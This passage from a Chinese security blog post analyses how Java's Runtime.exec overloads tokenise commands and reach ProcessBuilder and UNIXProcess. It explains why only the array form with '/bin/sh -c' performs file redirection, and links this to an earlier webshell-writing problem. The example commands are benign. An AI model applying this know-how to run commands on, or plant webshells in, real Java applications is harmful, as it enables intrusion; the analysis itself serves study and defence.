<p>&#x5982;&#x679C;&#x60F3;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">// linux</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]{<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;echo \&quot;flag\&quot; &gt; flag.txt&quot;</span>});</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// windows</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]{<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;echo \&quot;flag\&quot; &gt; flag.txt&quot;</span>});</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7A76;&#x5176;&#x539F;&#x56E0; <code>java.lang.Runtime</code> &#x4E2D;&#x5176;&#x5B9E;&#x6709; 6 &#x4E2A; <code>exec</code> &#x7684;&#x91CD;&#x8F7D;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210104234608650.png" alt="image-20210104234608650"></p>
<p>&#x67E5;&#x4E86;&#x4E0B;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF0C;&#x5927;&#x6982;&#x5982;&#x4E0B;&#xFF1A;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * &#x5728;&#x5355;&#x72EC;&#x7684;&#x8FDB;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x547D;&#x4EE4;</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String command)</span></span></span><br><span class="line"><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment">/**</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> * &#x5728;&#x5177;&#x6709;&#x6307;&#x5B9A;&#x73AF;&#x5883;&#x7684;&#x5355;&#x72EC;&#x8FDB;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x547D;&#x4EE4;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> */</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String command,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                    String[] envp)</span></span></span><br><span class="line"><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment">/**</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> * &#x5728;&#x5177;&#x6709;&#x6307;&#x5B9A;&#x73AF;&#x5883;&#x548C;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x7684;&#x5355;&#x72EC;&#x8FDB;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x547D;&#x4EE4;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> */</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String command,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                    String[] envp,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                    File dir)</span></span></span><br><span class="line"><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment">/**</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> * &#x5728;&#x5355;&#x72EC;&#x7684;&#x8FDB;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x547D;&#x4EE4;&#x548C;&#x53C2;&#x6570;&#x3002;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> */</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String[] cmdarray)</span></span></span><br><span class="line"><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment">/**</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> * &#x5728;&#x5177;&#x6709;&#x6307;&#x5B9A;&#x73AF;&#x5883;&#x7684;&#x5355;&#x72EC;&#x8FDB;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x547D;&#x4EE4;&#x548C;&#x53C2;&#x6570;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> */</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String[] cmdarray,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                    String[] envp)</span></span></span><br><span class="line"><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment">/**</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> * &#x5728;&#x5177;&#x6709;&#x6307;&#x5B9A;&#x73AF;&#x5883;&#x548C;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x7684;&#x5355;&#x72EC;&#x8FDB;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x547D;&#x4EE4;&#x548C;&#x53C2;&#x6570;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-comment"> */</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String[] cmdarray,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                    String[] envp,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                    File dir)</span></span></span><br><span class="line"><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0B;&#x9762;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x89E3;&#x6790;&#x6D41;&#x7A0B;&#x5206;&#x6790;&#xFF1A;</p>
<p>&#x9996;&#x5148;&#x5206;&#x6790; </p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="hljs-string">&quot;echo \&quot;flag\&quot; &gt; flag.txt&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x9996;&#x5148;&#x5C06;&#x547D;&#x4EE4;&#x5B8C;&#x5168;&#x4F20;&#x7ED9;&#x4E86; command &#x53C2;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x5F62;&#x5982; <code>exec(command, null, null);</code></p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105150858270.png" alt="image-20210105150858270"></p>
<p>&#x8FD9;&#x4E00;&#x6B65;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E3A; <code>command</code>&#xFF0C;&#x8DDF;&#x8FDB;&#x5206;&#x6790;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105151115015.png" alt="image-20210105151115015"></p>
<p>&#x7ECF;&#x8FC7;&#x5982;&#x4E0B;&#x5904;&#x7406;&#xFF1A;</p>
<p></p><figure class="highlight hljs"><table><tbody><tr><td class="code"><pre><span class="line">java.util.StringTokenizer#StringTokenizer(java.lang.String)</span><br><span class="line">-&gt;</span><br><span class="line">  java.util.StringTokenizer#StringTokenizer(java.lang.String, java.lang.String, boolean)</span><br><span class="line">  -&gt;</span><br><span class="line">  	java.util.StringTokenizer#setMaxDelimCodePoint</span><br><span class="line">-&gt;</span><br><span class="line">java.util.StringTokenizer#countTokens</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x8F6C;&#x6362;&#x6210;&#x4E86; cmdarray&#x3002;&#x5C06;&#x539F;&#x672C;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x503C;&#x8FDB;&#x884C;&#x4E86;&#x5207;&#x5272;&#xFF0C;&#x8F6C;&#x6362;&#x6210;&#x4E86;&#x6570;&#x7EC4;&#xFF0C;&#x6700;&#x540E;&#x518D;&#x6B21;&#x8C03;&#x7528; <code>exec</code> &#x91CD;&#x8F7D;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105151526661.png" alt="image-20210105151526661"></p>
<p>&#x8C03;&#x7528;&#x5230; <code>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</code>&#x3002;&#x540E;&#x7EED;&#x8C03;&#x7528;</p>
<p><code>java.lang.ProcessBuilder#start</code> &#x6765;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105152752920.png" alt="image-20210105152752920"></p>
<blockquote class="colorquote info"><p>&#x77E5;&#x8BC6;&#x70B9;&#x4E00;&#xFF1A;</p>
<p>java.lang.Runtime &#x4E2D; 6&#x4E2A; exec &#x7684;&#x91CD;&#x8F7D;&#x65B9;&#x6CD5;&#x6839;&#x636E;&#x53C2;&#x6570;&#x4E0D;&#x540C;&#x8FDB;&#x884C;&#x533A;&#x5206;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4F20;&#x5165;&#x5B57;&#x7B26;&#x4E32;&#x8DDF;&#x6570;&#x7EC4;&#x4E24;&#x79CD;&#x5F62;&#x5F0F;&#xFF0C;&#x4F46;&#x6700;&#x7EC8;&#x8C03;&#x7528;&#x90FD;&#x5728;<code>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</code> &#x8FD9;&#x91CC;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5185;&#x90E8;&#x9996;&#x5148;&#x8C03;&#x7528;ProcessBuilder&#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x521B;&#x5EFA;ProcessBuilder&#x5BF9;&#x8C61;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;start()&#xFF0C;&#x6700;&#x7EC8;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;Process&#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x77E5;&#x8BC6;&#x70B9;&#x4E8C;&#xFF1A;</p>
<p>Runtime#exec()&#x5E95;&#x5C42;&#x8FD8;&#x662F;&#x8C03;&#x7528;&#x7684;ProcessBuilder#start()&#xFF0C;&#x4E14;&#x4F20;&#x5165;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x8981;&#x6C42;&#x662F;&#x6570;&#x7EC4;&#x7C7B;&#x578B;&#x3002;&#x6240;&#x4EE5;&#x4F20;&#x7ED9;Runtime#exec()&#x7684;&#x547D;&#x4EE4;&#x5B57;&#x7B26;&#x4E32;&#x9700;&#x8981;&#x5148;&#x4F7F;&#x7528;StringTokenizer&#x7C7B;&#x5206;&#x5272;&#x4E3A;&#x6570;&#x7EC4;&#x518D;&#x4F20;&#x5165;ProcessBuilder&#x7C7B;</p>
</blockquote>



<p>&#x8FD9;&#x91CC;&#x540C;&#x65F6;&#x89E3;&#x91CA;&#x4E86;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x5E95;&#x5C42;&#x5173;&#x7CFB;&#xFF0C;&#x4EE5;&#x53CA;&#x89E3;&#x91CA;&#x4E86; <code>ProcessBuilder#start()</code> &#x4F20;&#x5165;&#x53C2;&#x6570;&#x503C;&#x7684;&#x95EE;&#x9898;&#x3002;&#x4F46;&#x4F3C;&#x4E4E;&#x8FD8;&#x6CA1;&#x6709;&#x89E3;&#x51B3;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x9057;&#x7559;&#x7684;&#x5199;&#x5165; webshell &#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>&#x5230;&#x8FD9;&#x91CC;&#x5148;&#x6682;&#x505C;&#x4E00;&#x4E0B;&#x3002;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x77E5;&#x9053; Runtime#exec()&#x5E95;&#x5C42;&#x8FD8;&#x662F;&#x8C03;&#x7528;&#x7684; ProcessBuilder#start()&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x53D8;&#x91CF;&#x63A7;&#x5236;&#x7684;&#x8303;&#x56F4;&#x5E94;&#x8BE5;&#x5728;&#x8FD9;&#x91CC;&#x5148;&#x505C;&#x4E0B;&#x3002;</p>
<p>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5F97;&#x77E5;&#x9053; <code>ProcessBuilder#start()</code> &#x9700;&#x8981;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x547D;&#x4EE4;&#x683C;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x624D;&#x80FD;&#x53BB;&#x63A7;&#x5236; <code>Runtime#exec</code> &#x7684;&#x53C2;&#x6570;&#x53BB;&#x8C03;&#x6574;&#xFF0C;&#x53C8;&#x56E0;&#x4E3A; <code>ProcessBuilder#start()</code> &#x6700;&#x540E;&#x4F1A;&#x8C03;&#x7528;&#x5230; <code>ProcessImpl.start()</code></p>
<p>&#x6211;&#x4EEC;&#x770B;&#x4E00;&#x4E0B;&#x4EE5;&#x4E0B;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#x4F20;&#x5165;&#x5230;  <code>ProcessImpl.start()</code>  &#x7684;&#x72B6;&#x6001;</p>
<ol>
<li><p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="hljs-string">&quot;echo echo flag &gt; flag.txt&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
</ol>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105195813557.png" alt="image-20210105195813557"></p>
<ol start="2">
<li><p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="hljs-string">&quot;/bin/sh -c echo flag &gt; flag.txt&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
</ol>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105195931773.png" alt="image-20210105195931773"></p>
<ol start="3">
<li><p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]{<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;echo flag &gt; flag.txt&quot;</span>});</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
</ol>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105191140624.png" alt="image-20210105191140624"></p>
<p><strong>&#x7740;&#x91CD;&#x770B;&#x7B2C;&#x4E09;&#x79CD;&#x65B9;&#x6CD5;</strong></p>
<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x662F;&#x76F4;&#x63A5; return &#x5230; <code>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</code> &#x7684;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105201427968.png" alt="image-20210105201427968"></p>
<p>&#x7136;&#x540E;&#x76F4;&#x63A5;&#x8FDB;&#x884C;&#x540E;&#x9762;&#x7684;&#x8C03;&#x7528; </p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105201541913.png" alt="image-20210105201541913"></p>
<p><strong>&#x5212;&#x91CD;&#x70B9;&#xFF1A;&#x4E0D;&#x4F1A;&#x7ECF;&#x8FC7; <code>StringTokenizer</code> &#x8FDB;&#x884C;&#x5B57;&#x7B26;&#x4E32;&#x5904;&#x7406;</strong></p>
<p>&#x7ECF;&#x8FC7;&#x5B9E;&#x9A8C;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x53EA;&#x6709; &#x7B2C;&#x4E09;&#x79CD; &#x662F;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x7A76;&#x5176;&#x6838;&#x5FC3;&#x539F;&#x56E0;&#x5728;&#x4E8E; <code>StringTokenizer</code> &#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5206;&#x5272;&#x7834;&#x574F;&#x4E86;&#x539F;&#x6709;&#x7684;&#x8BED;&#x4E49;&#xFF0C;&#x800C;&#x76F4;&#x63A5;&#x4F20;&#x5165;&#x6570;&#x7EC4;&#x7C7B;&#x578B;&#x5B57;&#x7B26;&#x4E32;&#x5219;&#x7531;&#x81EA;&#x5DF1;&#x5206;&#x5272;&#x5B57;&#x7B26;&#x4E32;</p>
<p>&#x800C;&#x7B2C;&#x4E00;&#x79CD;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x7684;&#x539F;&#x56E0;&#x662F;&#x56E0;&#x4E3A; Linux &#x4E0B;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x524D;&#x9762;&#x9700;&#x8981;&#x52A0;&#x4E0A;  <code>/bin/sh -c</code>&#xFF0C;&#x8BE6;&#x89C1;&#x540E;&#x9762;&#x5206;&#x6790;&#x3002;</p>
<p>&#x56DE;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E4B;&#x524D;&#x7684;&#x5206;&#x6790;&#x5DF2;&#x7ECF;&#x8C03;&#x7528;&#x5230; <code>ProcessImpl.start()</code> &#x4E86;</p>
<p><code>java.lang.Process</code> &#x91CC;&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#xFF1A;</p>
<blockquote>
<p>&#x53D6;&#x51FA; cmdarray[0] &#x8D4B;&#x503C;&#x7ED9;prog,&#x5982;&#x679C;&#x5B89;&#x5168;&#x7BA1;&#x7406;&#x5668; SecurityManager &#x5F00;&#x542F;,&#x4F1A;&#x8C03;&#x7528;SecurityManager#checkExec()&#x5BF9;&#x6267;&#x884C;&#x7A0B;&#x5E8F;prog&#x8FDB;&#x884C;&#x68C0;&#x67E5;</p>
</blockquote>
<p>&#x8DDF;&#x636E;&#x6CE8;&#x91CA;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x7684;&#x7528;&#x9014; &#xFF1A; Throws IndexOutOfBoundsException if command is empty</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105214313973.png" alt="image-20210105214313973"></p>
<p>&#x968F;&#x540E;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; <code>new UNIXProcess()</code></p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105214108311.png" alt="image-20210105214108311"></p>
<p>&#x9488;&#x5BF9;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x5904;&#x7406;&#x5728; <code>java.lang.ProcessImpl#toCString</code></p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105213850286.png" alt="image-20210105213850286"></p>
<p>&#x9488;&#x5BF9;&#x9664;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E4B;&#x5916;&#x7684;&#x5904;&#x7406;&#x5728;&#x4E4B;&#x524D;&#x5C31;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105214745759.png" alt="image-20210105214745759"></p>
<p>&#x4E4B;&#x540E;&#x8C03;&#x7528;&#x5230; <code>java.lang.UNIXProcess#UNIXProcess</code></p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105205855774.png" alt="image-20210105205855774"></p>
<p>&#x8FD9;&#x91CC;&#x8FD8;&#x4F1A;&#x8C03;&#x7528; <code>forkAndExec</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x662F;&#x4E00;&#x4E2A; native &#x65B9;&#x6CD5;&#xFF08;&#x4F1A;&#x8C03;&#x7528; C &#x8BED;&#x8A00;&#x4E4B;&#x7C7B;&#x7684;&#xFF09;</p>
<p>&#x770B;&#x4E00;&#x4E0B;&#x6B64;&#x65F6;&#x7684;&#x53C2;&#x6570;&#x5206;&#x5272;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105211753318.png" alt="image-20210105211753318"></p>
<blockquote>
<p>&#x5728;&#x5F00;&#x53D1;&#x8005;&#x7684;&#x773C;&#x4E2D;prog&#x662F;&#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;, argBlock&#x90FD;&#x662F;&#x4F20;&#x7ED9; prog &#x7684;&#x53C2;&#x6570;&#x3002;</p>
<p>&#x53EF;&#x89C1;&#x7ECF;&#x8FC7; StringTokenizer &#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7A7A;&#x683C;&#x7C7B;&#x7684;&#x5904;&#x7406;&#x5176;&#x5B9E;&#x662F;&#x4E00;&#x79CD;java&#x5BF9;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x4FDD;&#x62A4;&#x673A;&#x5236;&#xFF0C;&#x4ED6;&#x53EF;&#x4EE5;&#x9632;&#x5FA1;&#x4EE5;&#x4E0B;&#x8FD9;&#x79CD;&#x547D;&#x4EE4;&#x6CE8;&#x5165;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">&gt;String cmd = <span class="hljs-string">&quot;echo &quot;</span> + &#x53EF;&#x63A7;&#x70B9;;</span><br><span class="line">&gt;Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></tbody></table></figure><p></p>
</blockquote>
<p>&#x9898;&#x5916;&#x8BDD;&#xFF1A;&#x7AD9;&#x5728;&#x5F00;&#x53D1;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x770B;&#x8FD9;&#x4E5F;&#x786E;&#x5B9E;&#x662F; Java &#x76F8;&#x6BD4; PHP &#x5728;&#x9632;&#x6B62;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x7684;&#x573A;&#x666F;&#x5929;&#x7136;&#x7684;&#x4F18;&#x52BF;&#x4E86;</p>
<p>&#x542F;&#x52A8;&#x4E86;&#x4E00;&#x4E2A; sh &#x8FDB;&#x7A0B;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105212003953.png" alt="image-20210105212003953"></p>
<p>&#x90A3;&#x7B2C;&#x4E8C;&#x79CD;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x884C;&#x5462;&#xFF0C;&#x770B;&#x4E00;&#x4E0B;&#x7B2C;&#x4E8C;&#x79CD;&#x7684;&#x53C2;&#x6570;&#x5206;&#x5272;&#x3002;</p>
<p>&#x4F9D;&#x7167;&#x6211;&#x7684;&#x7406;&#x89E3;&#xFF1A;&#x65E2;&#x7136; argBlock &#x662F;&#x4F20;&#x9012;&#x7ED9; prog &#x7684;&#x53C2;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x5F53; echo &#x540E;&#x9762;&#x7684;&#x4E1C;&#x897F;&#x5206;&#x5FEB;&#x4F20;&#x64AD;&#x5C31;&#x4F1A;&#x7834;&#x574F;&#x539F;&#x6765;&#x7684;&#x8BED;&#x4E49;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x89E3;&#x6790; &#xFF08;&#x6211;&#x4E5F;&#x4E0D;&#x77E5;&#x9053;&#x8FD9;&#x6837;&#x7406;&#x89E3;&#x5BF9;&#x4E0D;&#x5BF9;<img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210104221719003.png" alt> &#xFF09;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105220301789.png" alt="image-20210105220301789"></p>
<p>&#x8FD9;&#x6837;&#x867D;&#x7136;&#x4E5F;&#x80FD;&#x542F;&#x4E00;&#x4E2A;sh&#x8FDB;&#x7A0B;&#xFF0C;&#x4F46;&#x7531;&#x4E8E;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x89E3;&#x6790;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x4F1A;&#x5199;&#x5165;&#x6587;&#x4EF6;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105220659575.png" alt="image-20210105220659575"></p>
<p>&#x800C;&#x7B2C;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#x663E;&#x7136;&#x4E0D;&#x80FD;&#x542F;&#x52A8;&#x4E00;&#x4E2A; sh &#x8FDB;&#x7A0B;&#xFF0C;&#x56E0;&#x6B64;&#x5728; Linux &#x4E0B;&#x7B2C;&#x4E00;&#x4E2A;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x9700;&#x8981;&#x4E3A; <code>/bin/sh</code>&#xFF0C;&#x6240;&#x4EE5;&#x7B2C;&#x4E00;&#x79CD;&#x4E0D;&#x884C;&#x3002;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105220920800.png" alt="image-20210105220920800"></p>
<p>&#x5173;&#x4E8E; Windows &#x7684;&#x5206;&#x6790;&#x53EF;&#x4EE5;&#x53C2;&#x8003; 360BugCloud &#x7684;&#x300A;&#x6D45;&#x6790;Java&#x547D;&#x4EE4;&#x6267;&#x884C;&#x300B;&#xFF1A;</p>
<blockquote>
<p><strong>&#x9700;&#x8981;&#x6DFB;&#x52A0;cmd /c&#x7684;&#x539F;&#x56E0;:</strong></p>
<p>&#x5728;&#x4F20;&#x5165;  echo_test &gt; echo.txt &#x547D;&#x4EE4;&#x5B57;&#x7B26;&#x4E32;&#x65F6;&#xFF0C;&#x51FA;&#x73B0;&#x9519;&#x8BEF;(&#x201C;java.io.IOException: Cannot run program &#x201C;echo&#x201D;: CreateProcess error=2, 